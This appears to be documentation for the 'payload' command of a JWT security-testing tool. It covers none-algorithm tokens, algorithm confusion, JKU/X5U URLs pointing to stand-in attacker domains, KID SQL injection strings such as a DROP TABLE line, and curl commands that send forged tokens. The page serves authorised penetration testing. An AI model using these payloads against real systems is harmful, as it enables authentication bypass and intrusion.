---
title: "Payload Command"
weight: 5
---

The `payload` command generates various JWT attack payloads for security testing and vulnerability assessment.

## Basic Usage

```bash
jwt-hack payload <TOKEN> [OPTIONS]
```

## Attack Payload Types

### None Algorithm Attack

Remove signature verification requirement:

```bash
jwt-hack payload <TOKEN> --target=none
```

Generates payloads with:
- `alg: "none"` (lowercase)
- `alg: "None"` (capitalized)  
- `alg: "NONE"` (uppercase)
- Various case combinations

### Algorithm Confusion Attack

Convert RSA tokens to HMAC using public key as secret:

```bash
jwt-hack payload <RSA_TOKEN> --target=alg_confusion
```

Creates payloads that:
- Change algorithm from RS256 to HS256
- Use public key content as HMAC secret
- Test algorithm substitution vulnerabilities

### JKU/X5U URL Attacks

Manipulate JSON Web Key URLs:

```bash
# Basic JKU/X5U attack
jwt-hack payload <TOKEN> --target=jku

# With trusted domain bypass
jwt-hack payload <TOKEN> --jwk-trust=trusted.com --jwk-attack=evil.com

# Custom protocol and attack domain  
jwt-hack payload <TOKEN> --jwk-attack=attacker.com --jwk-protocol=http
```

Generates payloads with:
- Malicious JKU URLs pointing to attacker-controlled keys
- X5U URLs for certificate chain manipulation
- Domain bypass techniques
- Protocol downgrade attacks

### KID SQL Injection

Inject SQL payloads in Key ID field:

```bash
jwt-hack payload <TOKEN> --target=kid_sql
```

Generates payloads with SQL injection vectors:
- `' OR 1=1--`
- `'; DROP TABLE users;--`
- `' UNION SELECT null--`
- Time-based blind SQL injection payloads

### X5C Certificate Injection

Inject malicious certificate chains:

```bash
jwt-hack payload <TOKEN> --target=x5c
```

Creates payloads with:
- Malicious certificate chains
- Self-signed certificates
- Certificate with custom extensions
- Chain validation bypass attempts

### CTY Content Type Attacks

Manipulate content type headers for XXE and deserialization:

```bash
jwt-hack payload <TOKEN> --target=cty
```

Generates payloads with content types for:
- `text/xml` - XML External Entity (XXE) attacks
- `application/xml` - XML processing vulnerabilities  
- `application/x-java-serialized-object` - Java deserialization
- `application/json+x-jackson-smile` - Jackson deserialization

## Generate All Payload Types

Create comprehensive attack payload set:

```bash
# Generate all attack types
jwt-hack payload <TOKEN> --target=all

# All attacks with custom domains
jwt-hack payload <TOKEN> --target=all --jwk-attack=evil.com --jwk-trust=trusted.com
```

## Command Options

### Required
- `<TOKEN>` - Base JWT token for payload generation

### Target Selection
- `--target <TYPE>` - Payload types: `all`, `none`, `jku`, `x5u`, `alg_confusion`, `kid_sql`, `x5c`, `cty`

### JKU/X5U Attack Options
- `--jwk-trust <DOMAIN>` - Trusted domain for bypass techniques
- `--jwk-attack <DOMAIN>` - Attacker-controlled domain
- `--jwk-protocol <PROTOCOL>` - Protocol to use (http/https, default: https)

## Output Format

Payloads are displayed with:
- Attack type identifier
- Modified JWT token
- Description of the attack vector
- Usage recommendations

Example output:
```
🎯 None Algorithm Attack Payloads:

[1] None Algorithm (lowercase)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[2] None Algorithm (capitalized)  
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[3] None Algorithm (uppercase)
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
```

## Attack Scenarios

### Testing Authentication Bypass
```bash
# Test if application accepts unsigned tokens
jwt-hack payload <TOKEN> --target=none

# Test each generated payload:
curl -H "Authorization: Bearer <NONE_PAYLOAD>" https://api.example.com/user
```

### Algorithm Confusion Testing
```bash
# Generate algorithm confusion payloads
jwt-hack payload <RSA_TOKEN> --target=alg_confusion

# Test with public key content as HMAC secret
curl -H "Authorization: Bearer <CONFUSED_PAYLOAD>" https://api.example.com/admin
```

### Key URL Manipulation
```bash
# Test JKU/X5U URL attacks
jwt-hack payload <TOKEN> --target=jku --jwk-attack=attacker.com

# Host malicious JWK at attacker.com/keys.json
# Test if application fetches keys from attacker URL
```

### SQL Injection in KID
```bash
# Generate KID SQL injection payloads  
jwt-hack payload <TOKEN> --target=kid_sql

# Test each payload for SQL injection responses
# Monitor application logs for SQL errors
```

## Security Testing Workflow

### 1. Reconnaissance
```bash
# Decode token to understand structure
jwt-hack decode <TOKEN>

# Generate comprehensive payload set
jwt-hack payload <TOKEN> --target=all
```

### 2. Systematic Testing
```bash
# Test none algorithm bypasses
jwt-hack payload <TOKEN> --target=none

# Test each payload systematically
# Document responses and behaviors
```

### 3. Advanced Attacks
```bash
# Algorithm confusion (if RSA token)
jwt-hack payload <RSA_TOKEN> --target=alg_confusion

# URL manipulation attacks
jwt-hack payload <TOKEN> --target=jku --jwk-attack=controlled-domain.com
```

## Payload Customization

### Custom Domains
```bash
# Use specific attack domains
jwt-hack payload <TOKEN> --target=jku --jwk-attack=evil.hacker.com

# Bypass domain restrictions
jwt-hack payload <TOKEN> --target=x5u --jwk-trust=trusted.com --jwk-attack=evil.com
```

### Protocol Selection
```bash
# Force HTTP for testing
jwt-hack payload <TOKEN> --target=jku --jwk-protocol=http --jwk-attack=attacker.com

# Test protocol downgrade vulnerabilities
```

## Integration with Testing Frameworks

### Burp Suite Integration
1. Generate payloads with JWT-HACK
2. Import into Burp Intruder
3. Use as payload list for systematic testing

### Custom Scripts
```bash
# Generate and test programmatically
jwt-hack payload <TOKEN> --target=all > payloads.txt

# Process payloads in custom testing script
while read payload; do
    test_jwt_payload "$payload"
done < payloads.txt
```

## Best Practices

### Responsible Testing
- Only test applications you own or have permission to test
- Document all findings appropriately
- Follow responsible disclosure practices

### Comprehensive Coverage
- Test all payload types systematically
- Combine with other testing techniques
- Verify results manually when automated tools indicate vulnerabilities